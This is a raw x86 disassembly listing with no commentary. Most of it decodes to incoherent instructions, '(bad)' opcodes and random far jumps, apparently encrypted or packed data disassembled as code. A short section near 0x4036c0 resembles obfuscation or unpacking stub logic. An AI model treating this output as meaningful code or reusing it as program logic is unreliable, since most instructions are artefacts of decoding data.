  4030f4:	jae    0x4030b3
  4030f6:	push   es
  4030f7:	dec    esp
  4030f8:	iret   
  4030f9:	sbb    DWORD PTR [edx+0x2c03905],esi
  4030ff:	dec    ebp
  403100:	sub    eax,0x26015582
  403105:	mov    si,0xc71d
  403109:	stc    
  40310a:	ds push esi
  40310c:	call   0xd59a:0x37e240ee
  403113:	je     0x403124
  403115:	dec    esp
  403116:	mov    al,ds:0x957f628e
  40311b:	and    ebx,DWORD PTR [ebp+0x1d]
  40311e:	out    0x5,eax
  403120:	mov    ds:0xb6a21a7a,eax
  403125:	pushf  
  403126:	xor    esp,DWORD PTR [esi+0x191d2b75]
  40312c:	jnp    0x4030f2
  40312e:	in     al,dx
  40312f:	in     eax,dx
  403130:	loope  0x403178
  403132:	in     eax,dx
  403133:	add    ah,BYTE PTR [eax-0x2a817ab2]
  403139:	(bad)  
  40313a:	push   esp
  40313b:	pop    eax
  40313c:	and    edx,eax
  40313e:	fsubrp st(1),st
  403140:	sbb    edi,DWORD PTR [edi]
  403142:	or     DWORD PTR [eax-0x46],0xffffff83
  403146:	sub    al,0x81
  403148:	add    BYTE PTR [ebx-0x3e],bh
  40314b:	rcl    BYTE PTR [ebp+0x4cadc79b],cl
  403151:	jle    0x4030e5
  403153:	idiv   BYTE PTR [ecx-0x3d]
  403156:	mov    ds:0x42c27b6f,al
  40315b:	mov    dl,0x23
  40315d:	lods   eax,DWORD PTR ds:[esi]
  40315e:	xor    BYTE PTR [esi],al
  403160:	jge    0x4031cc
  403162:	test   esi,esi
  403164:	cmp    esi,DWORD PTR [esi]
  403166:	stos   BYTE PTR es:[edi],al
  403167:	aam    0x5a
  403169:	stc    
  40316a:	cmp    al,0xf2
  40316c:	sbb    ah,cl
  40316e:	xchg   esi,eax
  40316f:	inc    esp
  403170:	cmp    eax,ecx
  403172:	xchg   ecx,eax
  403173:	call   0xc926303
  403178:	push   0xffffffac
  40317a:	test   eax,0x51e40ba0
  40317f:	jno    0x4031b5
  403181:	mov    ch,0x73
  403183:	dec    eax
  403184:	inc    eax
  403185:	pop    esp
  403186:	and    DWORD PTR [edx+ecx*2-0x2d],edx
  40318a:	ss jmp 0x40311d
  40318d:	jb     0x4031b4
  40318f:	rcr    DWORD PTR [edx+0x1e6c8f7f],cl
  403195:	mov    dl,0x5b
  403197:	int    0x53
  403199:	pop    eax
  40319a:	rcr    edi,cl
  40319c:	mov    ch,0xe9
  40319e:	inc    ebp
  40319f:	sbb    cl,bh
  4031a1:	sbb    ebx,eax
  4031a3:	int3   
  4031a4:	jb     0x4031c0
  4031a6:	xchg   ebp,eax
  4031a7:	pop    esi
  4031a8:	and    esi,eax
  4031aa:	jmp    0x85a:0x2fb2d303
  4031b1:	cs js  0x40315a
  4031b4:	mov    bh,0xc4
  4031b6:	rdtsc  
  4031b8:	add    al,0xde
  4031ba:	dec    ebx
  4031bb:	sub    eax,DWORD PTR [ebx]
  4031bd:	mov    dl,0x74
  4031bf:	div    DWORD PTR es:[edi-0x1d]
  4031c3:	mov    al,ds:0x404d859e
  4031c8:	imul   esp,edx,0x4f0a222c
  4031ce:	sub    eax,0x3921ca09
  4031d3:	and    ebx,edx
  4031d5:	(bad)  
  4031d8:	fldenv [edi+0x10]
  4031db:	sub    eax,0x443b950e
  4031e0:	cmp    al,0x5e
  4031e2:	mov    al,ds:0xb497126f
  4031e7:	leave  
  4031e8:	jns    0x403202
  4031ea:	ss adc ebp,ebx
  4031ed:	popa   
  4031ee:	mov    edi,0x8593f1e5
  4031f3:	mov    al,0x75
  4031f5:	(bad)  
  4031f6:	xchg   esp,eax
  4031f7:	jmp    0x5e39:0x4a320b4d
  4031fe:	inc    ecx
  4031ff:	popa   
  403200:	dec    ebp
  403201:	rcr    DWORD PTR [edx-0x3ddd294e],0x26
  403208:	dec    esi
  403209:	pop    esp
  40320a:	add    DWORD PTR [edx-0xc],ecx
  40320d:	imul   edi,esi,0x7c
  403210:	mov    ebx,0xf5fb532b
  403215:	rcl    ecx,0x1d
  403218:	wrmsr  
  40321a:	jae    0x403230
  40321c:	mov    BYTE PTR ds:0x8170fe13,bh
  403222:	mov    eax,0x619b8f1c
  403227:	mov    cl,0x1f
  403229:	mov    al,0x27
  40322b:	jbe    0x4031e7
  40322d:	push   esp
  40322e:	and    BYTE PTR [edx-0x34],ah
  403231:	out    0xcb,eax
  403233:	not    DWORD PTR [edi]
  403235:	mov    bl,0x3a
  403237:	pop    ss
  403238:	xor    BYTE PTR [edx+0x422db56f],dl
  40323e:	lods   eax,DWORD PTR ds:[esi]
  40323f:	dec    ebp
  403240:	mov    ecx,0x3aea67c
  403245:	je     0x4031ef
  403247:	call   0x6ab3eb95
  40324c:	xchg   ebx,eax
  40324d:	popa   
  40324e:	into   
  40324f:	sar    eax,cl
  403251:	or     dh,BYTE PTR [edx]
  403253:	mov    dh,0x25
  403255:	cld    
  403256:	in     al,dx
  403257:	mov    ebx,0x6c32732
  40325c:	sub    DWORD PTR [ebp-0x57b8e480],edx
  403262:	cli    
  403263:	(bad)  
  403264:	sahf   
  403265:	jecxz  0x403254
  403267:	inc    edi
  403268:	or     BYTE PTR [ecx+0x6d],bl
  40326b:	scas   al,BYTE PTR es:[edi]
  40326c:	mov    ch,0xa8
  40326e:	add    esi,ecx
  403270:	or     esi,edi
  403272:	test   DWORD PTR [edx-0x30c993de],ebp
  403278:	out    dx,al
  403279:	gs xor ebp,esp
  40327c:	repnz pop es
  40327e:	arpl   WORD PTR [bp+si+0x733c],dx
  403283:	(bad)  
  403286:	push   ss
  403287:	jle    0x40320b
  403289:	cmp    al,0x32
  40328b:	or     eax,0x1e74b0a2
  403290:	cmp    al,0xf2
  403292:	mul    DWORD PTR [esi-0x37f7ae6c]
  403298:	xchg   BYTE PTR ds:0xf0dae162,bl
  40329e:	mov    bl,0x29
  4032a0:	push   esp
  4032a1:	pop    edi
  4032a2:	retf   
  4032a3:	rcr    dh,cl
  4032a5:	mov    esi,0xf3492f69
  4032aa:	inc    esp
  4032ab:	or     al,0x2d
  4032ad:	sub    eax,0x6c36535f
  4032b2:	out    dx,eax
  4032b3:	add    esi,edi
  4032b5:	mov    cl,0x65
  4032b7:	add    ebx,esp
  4032b9:	je     0x40329d
  4032bb:	imul   edx,esp,0xfffffff8
  4032be:	test   al,0xbc
  4032c0:	push   ss
  4032c1:	stos   DWORD PTR es:[edi],eax
  4032c2:	cmp    ebx,DWORD PTR [esi+edx*8]
  4032c5:	add    bh,BYTE PTR [edx-0x74]
  4032c8:	push   edx
  4032c9:	jg     0x403260
  4032cb:	dec    edx
  4032cc:	scas   eax,DWORD PTR es:[edi]
  4032cd:	lods   eax,DWORD PTR ds:[esi]
  4032ce:	pop    ebx
  4032cf:	rol    DWORD PTR [ebx],1
  4032d1:	lea    edi,[edx+edi*1-0xc]
  4032d5:	(bad)  
  4032d6:	fbld   TBYTE PTR [eax-0x6f634c37]
  4032dc:	jl     0x4032a4
  4032de:	cmp    eax,0x2e8829d
  4032e3:	mov    bl,0x29
  4032e5:	xor    DWORD PTR [eax-0x47],ecx
  4032e8:	jno    0x4032b2
  4032ea:	ficomp WORD PTR [ebx]
  4032ec:	or     esp,DWORD PTR [edi+0x5e]
  4032ef:	inc    ebp
  4032f0:	jmp    0xe777bbf8
  4032f5:	adc    ch,bh
  4032f7:	repz fld DWORD PTR [esi]
  4032fa:	inc    esp
  4032fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032fc:	sub    ah,BYTE PTR [edx+0x233daadf]
  403302:	fcomi  st,st(1)
  403304:	or     eax,DWORD PTR [edx+0x74dbf4e1]
  40330a:	and    ebx,DWORD PTR [esi-0x2c077656]
  403310:	sbb    esi,DWORD PTR [edx+edx*2+0xf4079a1]
  403317:	push   edx
  403318:	or     dh,BYTE PTR [ecx+0x5090db57]
  40331e:	dec    esp
  40331f:	sbb    DWORD PTR [eax+esi*1],edi
  403322:	out    dx,eax
  403323:	and    ebx,DWORD PTR [ecx-0x20]
  403326:	mov    ecx,0xa080d75
  40332b:	repz cmp DWORD PTR [esi+0x2cf17fd3],edi
  403332:	xchg   esi,eax
  403333:	inc    eax
  403334:	mov    ds:0x6d4e33af,al
  403339:	fs cdq 
  40333b:	adc    al,bl
  40333d:	mov    BYTE PTR [edx+0x7e],bh
  403340:	inc    ebx
  403341:	pop    esp
  403342:	div    DWORD PTR [ebx+0xa409da3]
  403348:	in     al,0x32
  40334a:	adc    cl,BYTE PTR [ebp+0xa]
  40334d:	out    0x38,al
  40334f:	dec    edi
  403350:	or     eax,0xa173d43b
  403355:	mov    ds:0xc00d7eee,al
  40335a:	pop    ss
  40335b:	cmc    
  40335c:	dec    edx
  40335d:	sub    esp,DWORD PTR [edi-0x7ab516e4]
  403363:	int3   
  403364:	mov    ds:0xf1add53b,al
  403369:	mov    WORD PTR es:[ecx+0x59e92ded],cs
  403370:	test   eax,0xbd6e9210
  403375:	ins    DWORD PTR es:[edi],dx
  403376:	inc    esi
  403377:	inc    eax
  403378:	pop    ebx
  403379:	and    DWORD PTR [ecx+eiz*2],esp
  40337c:	inc    esi
  40337d:	mov    ds:0x2dac3406,al
  403382:	vpmaddwd xmm6,xmm5,xmm0
  403386:	add    al,0x7a
  403388:	fnstsw WORD PTR ds:0x83a92070
  40338e:	icebp  
  40338f:	(bad)  
  403390:	pop    ecx
  403391:	inc    ebx
  403392:	rol    BYTE PTR [esi+0x6c],cl
  403395:	js     0x4033fd
  403397:	mul    BYTE PTR [ecx+eiz*4-0x17]
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	xor    ecx,ecx
  4033bb:	sti    
  4033bc:	push   ebx
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403394
  4033c6:	xlat   BYTE PTR ds:[ebx]
  4033c7:	push   es
  4033c8:	aad    0xdd
  4033ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033cb:	mov    ebp,0x330b9414
  4033d0:	in     al,0x60
  4033d2:	loop   0x4033df
  4033d4:	stos   DWORD PTR es:[edi],eax
  4033d5:	stos   BYTE PTR es:[edi],al
  4033d6:	dec    DWORD PTR [ebp+0x4341732]
  4033dc:	xchg   edx,eax
  4033dd:	dec    eax
  4033de:	sbb    BYTE PTR [ecx],dh
  4033e0:	retf   0x902
  4033e3:	or     DWORD PTR [eax+0x17],esp
  4033e6:	iret   
  4033e7:	xchg   edi,eax
  4033e8:	jmp    0xf9c:0x62ae277c
  4033ef:	fwait
  4033f0:	es sbb al,0x58
  4033f3:	int3   
  4033f4:	add    BYTE PTR [esi+0x4da729dd],dl
  4033fa:	and    DWORD PTR [edx-0x7935ff4d],0x1e12cc1b
  403404:	aam    0xb8
  403406:	inc    edi
  403407:	fwait
  403408:	call   0xdb44:0x4a93efc4
  40340f:	cmp    bh,BYTE PTR ds:0xb7da46ed
  403415:	mov    ebx,0xbfd365e
  40341a:	data16 jnp 0x403447
  40341d:	add    eax,0xc329be04
  403422:	rcr    BYTE PTR [eax],0xe9
  403425:	mov    eax,0x8222ad34
  40342a:	fs inc ebp
  40342c:	xchg   DWORD PTR [edx+0x73],edx
  40342f:	xchg   BYTE PTR [ebp-0x1a39e0d9],dh
  403435:	loopne 0x4033fd
  403437:	mov    dl,0x6d
  403439:	ror    bh,1
  40343b:	xchg   ebx,eax
  40343c:	pop    ecx
  40343d:	push   edx
  40343e:	arpl   si,bp
  403440:	repz (bad) 
  403442:	xchg   edx,eax
  403443:	dec    sp
  403445:	sub    BYTE PTR ds:0xf61f87b9,0x4f
  40344c:	jo     0x403409
  40344e:	cmp    DWORD PTR [eax-0x2f],edi
  403451:	lock mov ch,0x3
  403454:	or     al,0xf0
  403456:	int    0x3a
  403458:	loope  0x40348f
  40345a:	inc    ecx
  40345b:	adc    ecx,DWORD PTR [ecx-0x3bb3e98e]
  403461:	lods   al,BYTE PTR ds:[esi]
  403462:	shr    DWORD PTR [ecx+0x5f],0x54
  403466:	xchg   ecx,edi
  403468:	mov    al,ds:0x9ef57cf1
  40346d:	data16 sub dl,0xe7
  403471:	dec    ebx
  403472:	push   ecx
  403473:	nop
  403474:	mov    ch,cl
  403476:	icebp  
  403477:	lods   al,BYTE PTR ds:[esi]
  403478:	out    0x5e,al
  40347a:	cmp    ch,bl
  40347c:	hlt    
  40347d:	fstp   TBYTE PTR [ebp-0x4b]
  403480:	jg     0x4034cf
  403482:	mov    WORD PTR [eax-0x683a41a0],es
  403488:	jne    0x403427
  40348a:	loop   0x403417
  40348c:	pop    ebx
  40348d:	enter  0x6f8e,0x6
  403491:	dec    esp
  403492:	out    dx,eax
  403493:	push   0x38
  403495:	xchg   ebx,eax
  403496:	ret    0xdad
  403499:	xchg   esp,eax
  40349a:	popf   
  40349b:	shl    DWORD PTR [eax+0x69981ab],1
  4034a1:	lds    ecx,FWORD PTR [ecx+0x458f4e34]
  4034a7:	stos   BYTE PTR es:[edi],al
  4034a8:	data16 sbb al,0x4f
  4034ab:	lods   eax,DWORD PTR ds:[esi]
  4034ac:	pop    es
  4034ad:	leave  
  4034ae:	addr16 pop es
  4034b0:	(bad)  
  4034b1:	xchg   edi,eax
  4034b2:	or     eax,0x35b8426b
  4034b7:	cli    
  4034b8:	test   DWORD PTR [eax+0x31ee1dff],edi
  4034be:	pop    ebx
  4034bf:	pop    ecx
  4034c0:	add    al,0xed
  4034c2:	lds    edi,FWORD PTR [esi-0x2125f4a8]
  4034c8:	scas   eax,DWORD PTR es:[edi]
  4034c9:	in     eax,0xba
  4034cb:	pop    edx
  4034cc:	xchg   edi,eax
  4034cd:	sbb    BYTE PTR [eax+ecx*4-0x5d5127b6],0xb9
  4034d5:	inc    esp
  4034d6:	popf   
  4034d7:	popa   
  4034d8:	dec    ebx
  4034d9:	mov    al,0xe3
  4034db:	jmp    0xf13f:0x215019c
  4034e2:	sbb    BYTE PTR [edx-0xad7a565],al
  4034e8:	fadd   DWORD PTR [esi-0x1ad07ce5]
  4034ee:	jg     0x4034b8
  4034f0:	ins    DWORD PTR es:[edi],dx
  4034f1:	xchg   BYTE PTR [eax+0x5f],cl
  4034f4:	mov    ch,0x14
  4034f6:	add    eax,DWORD PTR [esi+0x2]
  4034f9:	nop
  4034fa:	and    al,0x7c
  4034fc:	mov    esi,0xe62b1f09
  403501:	out    0xb9,al
  403503:	xchg   dl,al
  403505:	cmp    DWORD PTR [ebx+0x7b],ecx
  403508:	cmp    BYTE PTR [edx+0x64],bh
  40350b:	ret    0xcd80
  40350e:	jmp    0xa36beef2
  403513:	jge    0x4034ee
  403515:	add    DWORD PTR [edx+0x61094583],ebp
  40351b:	mov    eax,0x58a21b18
  403520:	loopne 0x40355c
  403522:	aam    0xf3
  403524:	xlat   BYTE PTR ds:[ebx]
  403525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403526:	sub    DWORD PTR [ecx],esi
  403528:	ret    0xaa03
  40352b:	mov    ah,0x82
  40352d:	xor    al,cl
  40352f:	pop    gs
  403531:	mov    eax,0xbfd3dd11
  403536:	call   0xbf7c53d5
  40353b:	and    dl,BYTE PTR [ebp+0x6b]
  40353e:	cmp    al,0x24
  403540:	into   
  403541:	pusha  
  403542:	and    eax,0x391c7196
  403547:	test   al,0xa9
  403549:	adc    BYTE PTR [ecx-0x31],bl
  40354c:	out    0xe,al
  40354e:	cmc    
  40354f:	mov    bh,0x94
  403551:	xchg   ecx,eax
  403552:	cmp    eax,0x8756ebec
  403557:	mov    eax,0xbaa28103
  40355c:	(bad)  
  40355d:	into   
  40355e:	adc    ebp,DWORD PTR [eax+0x3243dc0a]
  403564:	(bad)  
  403565:	scas   eax,DWORD PTR es:[edi]
  403566:	in     al,dx
  403567:	cdq    
  403568:	adc    DWORD PTR [ecx+0x1c],eax
  40356b:	je     0x40353f
  40356d:	jb     0x4034fa
  40356f:	bound  edi,QWORD PTR [ebx+0x17]
  403572:	out    dx,eax
  403573:	ds pop es
  403575:	cmc    
  403576:	cmp    eax,0x5a266466
  40357b:	add    ebp,DWORD PTR [edi+0x76]
  40357e:	add    DWORD PTR [ebp+esi*1-0x19],edi
  403582:	xchg   edx,eax
  403583:	ss test eax,0x4deb6aa7
  403589:	(bad)  
  40358a:	mov    bh,0x58
  40358c:	push   esi
  40358d:	cmp    BYTE PTR [ecx-0x66fbe129],bh
  403593:	or     al,0xbf
  403595:	jmp    0x712f:0xaa5ddc92
  40359c:	adc    al,0xc2
  40359e:	imul   bh
  4035a0:	xchg   esp,eax
  4035a1:	nop
  4035a2:	js     0x403539
  4035a4:	jo     0x40356d
  4035a6:	ret    0x8707
  4035a9:	and    esi,DWORD PTR [ebp+0xb5b66e1]
  4035af:	dec    edi
  4035b0:	pop    eax
  4035b1:	mov    ebx,DWORD PTR [eax+0x72b3be2c]
  4035b7:	or     ch,dl
  4035b9:	mov    dl,0xba
  4035bb:	addr16 cmp al,0xd8
  4035be:	icebp  
  4035bf:	pusha  
  4035c0:	sub    eax,DWORD PTR [ebp-0x2d]
  4035c3:	and    esi,edx
  4035c5:	mov    BYTE PTR [edx-0x65bf90d],cl
  4035cb:	sub    ebp,DWORD PTR [edi+ecx*8+0x5acbf50d]
  4035d2:	mov    BYTE PTR [ebp-0x5c],ah
  4035d5:	add    DWORD PTR [ebx-0x5a1e7c15],ebp
  4035db:	jmp    0x403613
  4035dd:	push   ebx
  4035de:	add    cl,BYTE PTR [ebp+0x282ef878]
  4035e4:	daa    
  4035e5:	test   DWORD PTR [ebp+0x41f68fcf],0x58ac59c8
  4035ef:	nop
  4035f0:	xor    eax,0xa2d7a177
  4035f5:	push   es
  4035f6:	or     BYTE PTR [ebx-0x80],bh
  4035f9:	out    0x53,al
  4035fb:	pop    ds
  4035fc:	(bad)  
  4035fe:	jno    0x4035be
  403600:	mov    ?,ecx
  403602:	xchg   edx,eax
  403603:	stos   DWORD PTR es:[edi],eax
  403604:	test   BYTE PTR [esi+ebx*2+0x39],cl
  403608:	sahf   
  403609:	cmp    ah,BYTE PTR [eax+ebp*2-0x7d]
  40360d:	or     ebp,esi
  40360f:	(bad)  
  403610:	ss push ds
  403612:	mov    eax,ds:0x634c2d88
  403617:	adc    al,0x2f
  403619:	or     ecx,DWORD PTR [edi]
  40361b:	out    0x56,al
  40361d:	es jecxz 0x403664
  403620:	mov    bl,0x3f
  403622:	imul   ebx,esi,0xba59a406
  403628:	or     bl,BYTE PTR [edx+0x64]
  40362b:	data16 add BYTE PTR [esi+0x23cc73a3],0x1b
  403633:	inc    edi
  403634:	pop    esp
  403635:	or     eax,0xb23cdbcd
  40363a:	mov    ds:0xbbdb14a5,eax
  40363f:	inc    edi
  403640:	pop    ebp
  403641:	push   ebx
  403642:	stos   DWORD PTR es:[edi],eax
  403643:	sub    esp,DWORD PTR [esi]
  403645:	dec    edi
  403646:	inc    ebx
  403647:	lea    edx,[ecx+0x3c6f63c7]
  40364d:	pop    DWORD PTR [ecx-0x5b91ab2a]
  403653:	cmp    cl,BYTE PTR [esi-0x41]
  403656:	loopne 0x403685
  403658:	in     al,dx
  403659:	dec    esi
  40365a:	pop    ss
  40365b:	pop    edx
  40365c:	fimul  WORD PTR [esi+edx*4+0x393f05ca]
  403663:	push   0xc41bf1f5
  403668:	add    ah,al
  40366a:	push   edi
  40366b:	adc    ah,ah
  40366d:	add    ch,0xbe
  403670:	aad    0x87
  403672:	mov    ebx,0x3f1d0793
  403677:	mov    bh,0x1
  403679:	inc    edx
  40367a:	fstp   QWORD PTR [ecx+0x43]
  40367d:	mov    dl,0x40
  40367f:	jnp    0x4036ec
  403681:	cli    
  403682:	pop    eax
  403683:	cwde   
  403684:	icebp  
  403685:	sub    eax,0x3848a11
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ebp-0x51],esi
  4037a3:	mov    eax,ds:0x701178b5
  4037a8:	jo     0x4037e7
  4037aa:	jge    0x40381c
  4037ac:	jo     0x4037b8
  4037ae:	js     0x4037a1
  4037b0:	sbb    DWORD PTR [ecx],ebp
  4037b2:	sbb    esi,edi
  4037b4:	xchg   ecx,eax
  4037b5:	or     ebx,ebx
  4037b7:	push   0x49
  4037b9:	or     esp,DWORD PTR [ebx-0x577af351]
  4037bf:	adc    DWORD PTR [ecx+0x3b5956f],edi
  4037c5:	xor    BYTE PTR [edx-0x19],dh
  4037c8:	pusha  
  4037c9:	sub    DWORD PTR [esi],edx
  4037cb:	cmp    DWORD PTR [eax-0x7a2f61a3],eax
  4037d1:	or     al,0x58
  4037d3:	int    0x3e
  4037d5:	jle    0x4037d5
  4037d7:	rol    BYTE PTR es:[ecx-0x77],1
  4037db:	mov    al,ds:0x66458f26
  4037e0:	or     BYTE PTR [eax],bl
  4037e2:	cli    
  4037e3:	in     al,0x5
  4037e5:	ss push cs
  4037e7:	test   al,0x32
  4037e9:	cmp    al,0xc
  4037eb:	int    0x4e
  4037ed:	xor    dl,BYTE PTR [ebp+0x27]
  4037f0:	or     eax,0x44416520
  4037f5:	rcl    DWORD PTR [edx],0x81
  4037f8:	or     BYTE PTR [edi],bh
  4037fa:	call   0x74125527
  4037ff:	cdq    
  403800:	sbb    esp,DWORD PTR [ebx+0x71]
  403803:	jbe    0x4037c3
  403805:	iret   
  403806:	pop    ss
  403807:	push   ebp
  403808:	xchg   esi,eax
  403809:	out    0x1d,eax
  40380b:	or     esi,edx
  40380d:	dec    ecx
  40380e:	imul   eax,edi,0x4b
  403811:	jp     0x403889
  403813:	out    dx,al
  403814:	fwait
  403815:	sub    al,0x34
  403817:	jmp    0x5699a85c
  40381c:	loopne 0x403831
  40381e:	sbb    al,0x76
  403820:	mov    eax,0xab6b6b86
  403825:	dec    edi
  403826:	jns    0x403845
  403828:	cmc    
  403829:	sub    dl,BYTE PTR [ebp-0xb6ed745]
  40382f:	(bad)  
  403830:	fsub   DWORD PTR [edx+edx*4-0x2f85b673]
  403838:	lahf   
  403839:	inc    ebp
  40383a:	out    0xbc,al
  40383c:	aas    
  40383d:	sub    esi,DWORD PTR [edi]
  40383f:	ds (bad) 
  403841:	out    0x12,al
  403843:	inc    edi
  403844:	cmp    esi,DWORD PTR [edx]
  403846:	addr16 dec esp
  403848:	add    al,0xb0
  40384a:	xchg   ebp,eax
  40384b:	sbb    eax,0xf22a6d28
  403850:	retf   
  403851:	test   BYTE PTR [esi+eax*1],ch
  403854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403855:	or     DWORD PTR [ebp+0x21b0f0b0],ebx
  40385b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40385c:	mov    ebp,0x961484a8
  403861:	sub    esp,DWORD PTR [edi-0x2d360b92]
  403867:	fstp   TBYTE PTR [ebx]
  403869:	hlt    
  40386a:	inc    ebp
  40386b:	xor    ebx,DWORD PTR [ecx+edx*4]
  40386e:	lahf   
  40386f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403870:	ds inc eax
  403872:	out    dx,al
  403873:	arpl   WORD PTR [ecx+0x771a223e],ax
  403879:	jno    0x403859
  40387b:	(bad)
  40387e:	xchg   ebx,eax
  40387f:	dec    edx
  403880:	xchg   BYTE PTR [edi+0xfb070a5],dh
  403886:	stos   DWORD PTR es:[edi],eax
  403887:	pop    esi
  403888:	xchg   DWORD PTR [esi+0x290aa7b0],esp
  40388e:	mov    edi,0x4885cb2b
  403893:	ins    BYTE PTR es:[edi],dx
  403894:	shr    DWORD PTR [ebp-0x35],cl
  403897:	call   0xea6a:0xff95a378
  40389e:	mov    ds:0xf6a10891,eax
  4038a3:	jne    0x40388f
  4038a5:	popa   
  4038a6:	outs   dx,BYTE PTR ds:[esi]
  4038a7:	pop    esp
  4038a8:	pop    ss
  4038a9:	shl    cl,0xaa
  4038ac:	add    al,0x4f
  4038ae:	push   esi
  4038af:	or     al,0x6
  4038b1:	pusha  
  4038b2:	fsub   DWORD PTR [edi-0x3]
  4038b5:	push   edi
  4038b6:	pop    ebp
  4038b7:	idiv   BYTE PTR [esi+esi*2-0x34]
  4038bb:	adc    al,0x93
  4038bd:	dec    edx
  4038be:	jg     0x40386f
  4038c0:	in     eax,dx
  4038c1:	sub    BYTE PTR [ecx+ebp*2],ah
  4038c4:	clc    
  4038c5:	xchg   DWORD PTR [esi+0x2b5588ff],esi
  4038cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038cc:	cwde   
  4038cd:	out    dx,al
  4038ce:	and    DWORD PTR [edi-0x27],0xf
  4038d2:	pop    ebx
  4038d3:	scas   eax,DWORD PTR es:[edi]
  4038d4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038d6:	mov    esp,DWORD PTR [esi+esi*1+0x4a]
  4038da:	mov    DWORD PTR [edx-0x842c823],0x7766ec44
  4038e4:	xor    ch,BYTE PTR [ebp-0x5a052939]
  4038ea:	das    
  4038eb:	sbb    esi,DWORD PTR [ecx+0x3bfe4c8a]
  4038f1:	stos   BYTE PTR es:[edi],al
  4038f2:	cs clc 
  4038f4:	sti    
  4038f5:	mov    edx,0xdd0aa43a
  4038fa:	or     BYTE PTR [ecx+0x59],ch
  4038fd:	dec    edi
  4038fe:	inc    ebp
  4038ff:	outs   dx,DWORD PTR ds:[esi]
  403900:	add    BYTE PTR [ebx+eax*4-0x79],ch
  403904:	shl    cl,1
  403906:	xlat   BYTE PTR ds:[ebx]
  403907:	xor    eax,0xd288d2bf
  40390c:	iret   
  40390d:	repnz daa 
  40390f:	hlt    
  403910:	das    
  403911:	push   eax
  403912:	adc    al,0x61
  403914:	add    esi,DWORD PTR [ecx-0x2c]
  403917:	lea    edx,[ebp+0x28]
  40391a:	adc    eax,DWORD PTR [ebx-0x3099eb1a]
  403920:	pop    esp
  403921:	repz mov eax,0x62912bf7
  403927:	add    DWORD PTR [edx+0x2d51bac1],ebp
  40392d:	dec    edx
  40392e:	jmp    0x86e520ac
  403933:	jmp    0x403956
  403935:	mov    esp,0x5d4674a2
  40393a:	jle    0x403914
  40393c:	jo     0x4038c0
  40393e:	mov    ds:0xb4f5be6,al
  403943:	pop    edi
  403944:	aam    0x9f
  403946:	daa    
  403947:	add    al,0xf7
  403949:	sbb    eax,0x89343ed0
  40394e:	xor    BYTE PTR [edi],dh
  403950:	icebp  
  403951:	inc    eax
  403952:	ret    
  403953:	sahf   
  403954:	pop    ds
  403955:	test   al,0x59
  403957:	push   esp
  403958:	(bad)  
  403959:	pop    ecx
  40395a:	pop    edx
  40395b:	and    dh,BYTE PTR [edi+0x1a]
  40395e:	icebp  
  40395f:	xchg   edi,eax
  403960:	cs jo  0x4039de
  403963:	fcom   st(7)
